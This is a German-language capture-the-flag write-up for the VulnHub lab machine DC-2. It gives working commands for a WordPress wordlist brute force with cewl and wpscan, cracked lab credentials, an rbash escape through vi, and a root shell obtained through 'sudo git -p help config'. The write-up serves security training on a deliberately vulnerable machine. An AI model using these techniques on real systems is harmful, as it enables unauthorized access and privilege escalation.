DC-2 CTF Writeup

Eine strukturierte Übersicht der gelösten Aufgaben und Schritte für die VulnHub-Maschine DC-2.

⚙️ Vorbereitung & Setup

Ziel: Lokale DNS-Auflösung einrichten, um die WordPress-Instanz im Browser und über Tools ansprechen zu können.

Befehl: sudo sh -c "echo '192.168.100.10 dc-2' >> /etc/hosts"

🚩 Flags & Level-Lösungen

Flag 1

Ziel: Benutzer auf dem WordPress-System identifizieren und eine maßgeschneiderte Passwort-Wortliste erstellen.

Lösung: Die Website mit cewl nach Schlüsselwörtern scannen, um eine benutzerdefinierte Wortliste zu erstellen. Anschließend mit wpscan nach registrierten Benutzern suchen.

Befehle:

Wortliste erstellen: cewl http://dc-2 -w pass.txt

Benutzer identifizieren: wpscan --url http://dc-2 -e u (Gefundene User: admin, tom, jerry)

Brute-Force-Angriff ausführen: wpscan --url http://dc-2 -U './user.txt' -P './pass.txt'

Gefundene Zugangsdaten:

jerry / adipiscing

tom / parturient

Inhalt von Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
More passwords is always better, but sometimes you just can’t win them all.
Log in as one to see the next flag.
If you can’t find it, log in as another.


Flag 2

Ziel: Im WordPress-Adminpanel anmelden und den Hinweis für den nächsten Schritt finden.

Lösung: Mit den Zugangsdaten von Jerry oder Tom im WordPress-Dashboard (http://dc-2/wp-login.php) anmelden.

Inhalt von Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.
Hope you found another entry point.


Flag 3 (User: Tom)

Ziel: Über einen alternativen Dienst (SSH) auf das System zugreifen und die dritte Flagge auslesen.

Lösung: SSH-Verbindung auf dem unüblichen Port 7744 als Benutzer tom herstellen und die Datei in Toms Home-Verzeichnis mit less öffnen (da cat in der restricted Shell rbash eventuell gesperrt ist).

Befehl: ssh tom@192.168.100.10 -p 7744 (Passwort: parturient)

Befehl (Flag lesen): less flag3.txt (mit q schließen)

Inhalt von Flag 3:

Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.


Flag 4 (User: Jerry)

Ziel: Die eingeschränkte Shell (rbash) umgehen, Umgebungsvariablen neu setzen und zu Benutzer Jerry wechseln.

Lösung:

Den Texteditor vi starten, um die rbash zu verlassen:

:set shell=/bin/bash
:shell


Die Umgebungsvariable $PATH anpassen, um alle Systembefehle wieder nutzen zu können:

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm


Zum Benutzer jerry wechseln und die Flagge in Jerrys Home-Verzeichnis auslesen:

su jerry (Passwort: adipiscing)
cd /home/jerry
cat flag4.txt


Inhalt von Flag 4:

Good to see that you've made it this far - but you're not home yet. 
You still need to get the final flag (the only flag that really counts!!!).  
No hints here - you're on your own now.  :-)
Go on - git outta here!!!!


Final Flag (Root Privilege Escalation)

Ziel: Root-Rechte erlangen und das finale Zertifikat auslesen.

Lösung: Da Jerry die Erlaubnis hat, git als Root ohne Passwortabfrage auszuführen (sudo -l), lässt sich der interaktive Pager von Git für ein Privilege Escalation nutzen.

Befehl: sudo git -p help config

Exploit: Im geöffneten Git-Hilfemenü folgenden Befehl eintippen, um eine Root-Shell zu spawnen:

!/bin/sh


Befehl (Flag lesen): cat /root/final-flag.txt

Inhalt der finalen Flagge:

 __    __     _ _       _                     _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___   / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulations!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
